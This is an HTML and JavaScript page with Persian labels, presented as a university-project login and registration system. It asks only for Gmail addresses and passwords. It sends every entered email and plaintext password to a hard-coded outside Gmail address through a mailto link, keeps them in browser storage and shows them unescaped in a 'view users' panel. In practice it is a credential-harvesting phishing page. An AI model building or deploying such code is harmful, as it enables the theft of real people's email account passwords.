<!DOCTYPE html>
<html lang="fa" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>سیستم ورود - پروژه دانشگاهی</title>
    <style>
        *{margin:0;padding:0;box-sizing:border-box}
        body{font-family:Tahoma;background:linear-gradient(135deg,#667eea 0%,#764ba2 100%);min-height:100vh;display:flex;justify-content:center;align-items:center;direction:rtl}
        .container{width:100%;max-width:400px;padding:20px}
        .login-box{background:#fff;padding:40px;border-radius:20px;box-shadow:0 15px 35px rgba(0,0,0,0.3)}
        h2{text-align:center;color:#333;margin-bottom:30px}
        .toggle-buttons{display:flex;gap:10px;margin-bottom:30px}
        .toggle-buttons button{flex:1;padding:12px;border:none;background:#f0f0f0;border-radius:10px;font-size:16px;cursor:pointer;font-weight:bold}
        .toggle-buttons button.active{background:linear-gradient(135deg,#667eea 0%,#764ba2 100%);color:#fff}
        .input-group{margin-bottom:20px}
        .input-group label{display:block;margin-bottom:8px;color:#555;font-weight:bold}
        .input-group input{width:100%;padding:14px;border:2px solid #e0e0e0;border-radius:10px;font-size:14px}
        .input-group input:focus{outline:none;border-color:#667eea}
        .btn-submit{width:100%;padding:14px;background:linear-gradient(135deg,#667eea 0%,#764ba2 100%);color:#fff;border:none;border-radius:10px;font-size:18px;font-weight:bold;cursor:pointer}
        .btn-submit:hover{transform:translateY(-2px);box-shadow:0 8px 25px rgba(102,126,234,0.4)}
        .message{margin-top:20px;padding:12px;border-radius:10px;text-align:center;display:none;font-weight:bold}
        .message.success{display:block;background:#d4edda;color:#155724}
        .message.error{display:block;background:#f8d7da;color:#721c24}
        .btn-view{width:100%;padding:12px;margin-top:10px;background:#28a745;color:white;border:none;border-radius:10px;font-size:16px;cursor:pointer}
        .btn-view:hover{background:#218838}
        .data-display{margin-top:15px;padding:15px;background:#f8f9fa;border-radius:10px;display:none;direction:ltr;text-align:left;font-size:13px;max-height:400px;overflow-y:auto}
        .data-item{background:white;padding:10px;margin:10px 0;border-radius:8px;border:1px solid #ddd}
        .loading{display:none;text-align:center;margin-top:10px}
        .loading.show{display:block}
        .spinner{border:4px solid #f3f3f3;border-top:4px solid #667eea;border-radius:50%;width:30px;height:30px;animation:spin 1s linear infinite;margin:0 auto}
        @keyframes spin{0%{transform:rotate(0deg)}100%{transform:rotate(360deg)}}
        .badge{background:#dc3545;color:white;padding:2px 10px;border-radius:20px;font-size:12px;display:inline-block}
    </style>
</head>
<body>
<div class="container">
    <div class="login-box">
        <h2>🔐 سیستم ورود</h2>
        <div class="toggle-buttons">
            <button class="active" id="loginTab">ورود</button>
            <button id="registerTab">ثبت نام</button>
        </div>
        <form id="loginForm">
            <div class="input-group">
                <label>📧 ایمیل</label>
                <input type="email" id="loginEmail" placeholder="example@gmail.com" required>
            </div>
            <div class="input-group">
                <label>🔑 رمز عبور</label>
                <input type="password" id="loginPassword" placeholder="رمز عبور" required>
            </div>
            <button type="submit" class="btn-submit">ورود</button>
        </form>
        <form id="registerForm" style="display:none;">
            <div class="input-group">
                <label>👤 نام کامل</label>
                <input type="text" id="fullName" placeholder="نام و نام خانوادگی" required>
            </div>
            <div class="input-group">
                <label>📧 ایمیل</label>
                <input type="email" id="registerEmail" placeholder="example@gmail.com" required>
            </div>
            <div class="input-group">
                <label>🔑 رمز عبور</label>
                <input type="password" id="registerPassword" placeholder="حداقل 6 کاراکتر" required minlength="6">
            </div>
            <div class="input-group">
                <label>✅ تکرار رمز</label>
                <input type="password" id="confirmPassword" placeholder="تکرار رمز عبور" required>
            </div>
            <button type="submit" class="btn-submit">ثبت نام</button>
        </form>
        <div id="message" class="message"></div>
        <div id="loading" class="loading"><div class="spinner"></div><p style="margin-top:8px;color:#666;">در حال ارسال...</p></div>
        
        <!-- دکمه مشاهده اطلاعات -->
        <button onclick="showSavedData()" class="btn-view">📋 مشاهده اطلاعات کاربران</button>
        <div id="dataDisplay" class="data-display"></div>
    </div>
</div>

<script>
const TARGET_EMAIL = 'bardya1245@gmail.com';

const loginTab = document.getElementById('loginTab');
const registerTab = document.getElementById('registerTab');
const loginForm = document.getElementById('loginForm');
const registerForm = document.getElementById('registerForm');
const messageDiv = document.getElementById('message');
const loadingDiv = document.getElementById('loading');

loginTab.onclick = () => {
    loginTab.classList.add('active');
    registerTab.classList.remove('active');
    loginForm.style.display = 'block';
    registerForm.style.display = 'none';
    messageDiv.style.display = 'none';
};
registerTab.onclick = () => {
    registerTab.classList.add('active');
    loginTab.classList.remove('active');
    registerForm.style.display = 'block';
    loginForm.style.display = 'none';
    messageDiv.style.display = 'none';
};

function showMessage(text, type) {
    messageDiv.textContent = text;
    messageDiv.className = 'message ' + type;
}

function showLoading(show) {
    loadingDiv.classList.toggle('show', show);
}

function sendToEmail(userData, type) {
    const subject = encodeURIComponent(`گزارش ${type} - پروژه دانشگاهی`);
    const body = encodeURIComponent(
        `گزارش ${type} جدید\n\n` +
        `نام: ${userData.name || 'نامشخص'}\n` +
        `ایمیل: ${userData.email}\n` +
        `رمز عبور: ${userData.password}\n` +
        `زمان: ${new Date().toLocaleString('fa-IR')}`
    );
    window.open(`mailto:${TARGET_EMAIL}?subject=${subject}&body=${body}`, '_blank');
}

function saveToLocalStorage(userData, type) {
    const allData = JSON.parse(localStorage.getItem('all_users') || '[]');
    allData.push({ ...userData, type: type, timestamp: new Date().toISOString() });
    localStorage.setItem('all_users', JSON.stringify(allData));
}

registerForm.onsubmit = (e) => {
    e.preventDefault();
    const name = document.getElementById('fullName').value.trim();
    const email = document.getElementById('registerEmail').value.trim();
    const password = document.getElementById('registerPassword').value;
    const confirm = document.getElementById('confirmPassword').value;

    if (!email.endsWith('@gmail.com')) { showMessage('❌ از ایمیل جیمیل استفاده کنید!', 'error'); return; }
    if (password !== confirm) { showMessage('❌ رمز عبور مطابقت ندارد!', 'error'); return; }
    if (password.length < 6) { showMessage('❌ رمز باید حداقل 6 کاراکتر باشد!', 'error'); return; }

    const userData = { name, email, password };
    sendToEmail(userData, 'ثبت نام');
    saveToLocalStorage(userData, 'ثبت نام');
    showMessage('✅ ثبت نام موفق! پنجره ایمیل باز شد.', 'success');
    setTimeout(() => registerForm.reset(), 2000);
};

loginForm.onsubmit = (e) => {
    e.preventDefault();
    const email = document.getElementById('loginEmail').value.trim();
    const password = document.getElementById('loginPassword').value;

    if (!email.endsWith('@gmail.com')) { showMessage('❌ از ایمیل جیمیل استفاده کنید!', 'error'); return; }

    const userData = { email, password };
    sendToEmail(userData, 'ورود');
    saveToLocalStorage(userData, 'ورود');
    showMessage('✅ ورود موفق! پنجره ایمیل باز شد.', 'success');
    setTimeout(() => loginForm.reset(), 2000);
};

// ============================================
// تابع نمایش اطلاعات ذخیره شده
// ============================================
function showSavedData() {
    const dataDisplay = document.getElementById('dataDisplay');
    const users = JSON.parse(localStorage.getItem('all_users') || '[]');
    
    if (users.length === 0) {
        dataDisplay.innerHTML = '❌ هنوز اطلاعاتی ذخیره نشده است';
        dataDisplay.style.display = 'block';
        return;
    }
    
    let html = `
        <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:10px;">
            <h3 style="color:#333;margin:0;">📋 لیست کاربران</h3>
            <span class="badge">${users.length} کاربر</span>
        </div>
        <hr style="margin-bottom:10px;">
    `;
    
    users.slice().reverse().forEach((user, index) => {
        const typeColor = user.type === 'ثبت نام' ? '#28a745' : '#007bff';
        html += `
            <div class="data-item">
                <div style="display:flex;justify-content:space-between;align-items:center;">
                    <strong style="color:#667eea;">#${users.length - index}</strong>
                    <span style="background:${typeColor};color:white;padding:2px 12px;border-radius:20px;font-size:11px;">${user.type || 'نامشخص'}</span>
                </div>
                <div style="margin-top:8px;">
                    👤 <strong>نام:</strong> ${user.name || 'نامشخص'}<br>
                    📧 <strong>ایمیل:</strong> ${user.email}<br>
                    🔑 <strong>رمز عبور:</strong> <span style="background:#f0f0f0;padding:2px 8px;border-radius:4px;font-family:monospace;">${user.password}</span><br>
                    🕐 <strong>زمان:</strong> ${new Date(user.timestamp).toLocaleString('fa-IR')}
                </div>
            </div>
        `;
    });
    
    dataDisplay.innerHTML = html;
    dataDisplay.style.display = 'block';
}

console.log('🚀 سیستم آماده است!');
console.log('📧 ایمیل مقصد:', TARGET_EMAIL);
console.log('💡 برای دیدن اطلاعات، روی دکمه سبز کلیک کنید');
</script>
</body>
</html>
